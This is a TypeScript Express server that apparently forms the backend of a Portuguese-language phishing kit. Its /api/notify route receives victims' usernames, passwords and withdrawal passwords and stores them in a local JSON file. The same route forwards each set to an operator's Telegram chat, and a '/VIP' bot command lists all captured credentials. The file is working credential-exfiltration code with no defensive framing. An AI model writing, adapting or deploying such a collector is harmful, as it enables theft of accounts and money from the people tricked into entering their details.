import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import axios from "axios";
import dotenv from "dotenv";
import fs from "fs";

dotenv.config();

const DATA_FILE = path.join(process.cwd(), "captured_data.json");

// Helper to read/write data
function getCapturedData() {
  if (!fs.existsSync(DATA_FILE)) return [];
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
  } catch (e) {
    return [];
  }
}

function saveCapturedData(data: any) {
  const current = getCapturedData();
  current.push(data);
  fs.writeFileSync(DATA_FILE, JSON.stringify(current, null, 2));
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Route to send data to Telegram and store locally
  app.post("/api/notify", async (req, res) => {
    const { user, pass, withdraw_pass, timestamp } = req.body;
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Store data locally
    saveCapturedData({ user, pass, withdraw_pass, timestamp });

    if (!token || !chatId) {
      console.warn("Telegram credentials missing, but data stored locally.");
      return res.json({ success: true, warning: "Telegram notification skipped" });
    }

    const message = `
🔥 *NOVO ACESSO VIP* 🔥
━━━━━━━━━━━━━━━
👤 *Usuário:* \`${user}\`
🔑 *Senha:* \`${pass}\`
💰 *Senha Saque:* \`${withdraw_pass}\`
⏰ *Data:* ${new Date(timestamp).toLocaleString('pt-BR')}
━━━━━━━━━━━━━━━
    `;

    try {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      });
      res.json({ success: true });
    } catch (error) {
      console.error("Error sending to Telegram:", error);
      res.status(500).json({ error: "Failed to send notification" });
    }
  });

  // Telegram Webhook Handler
  app.post("/api/telegram-webhook", async (req, res) => {
    const { message } = req.body;
    if (!message || !message.text) return res.sendStatus(200);

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const text = message.text.trim();

    if (text === "/VIP" || text.startsWith("/VIP")) {
      const data = getCapturedData();
      let responseText = "💎 *RELATÓRIO DE ACESSOS VIP* 💎\n\n";

      if (data.length === 0) {
        responseText += "Nenhum dado capturado ainda.";
      } else {
        data.forEach((item: any, index: number) => {
          responseText += `*#${index + 1}* 👤 \`${item.user}\` | 🔑 \`${item.pass}\` | 💰 \`${item.withdraw_pass}\`\n`;
        });
      }

      try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
          chat_id: message.chat.id,
          text: responseText,
          parse_mode: "Markdown",
        });
      } catch (err) {
        console.error("Webhook response failed", err);
      }
    }

    res.sendStatus(200);
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", async () => {
    console.log(`Server running on http://localhost:${PORT}`);
    
    // Auto-setup Telegram Webhook
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const appUrl = process.env.APP_URL;
    if (token && appUrl) {
      try {
        const webhookUrl = `${appUrl.replace(/\/$/, '')}/api/telegram-webhook`;
        await axios.post(`https://api.telegram.org/bot${token}/setWebhook`, {
          url: webhookUrl,
        });
        console.log(`Telegram Webhook set to: ${webhookUrl}`);
      } catch (err) {
        console.error("Failed to set Telegram Webhook:", err);
      }
    }
  });
}

startServer();
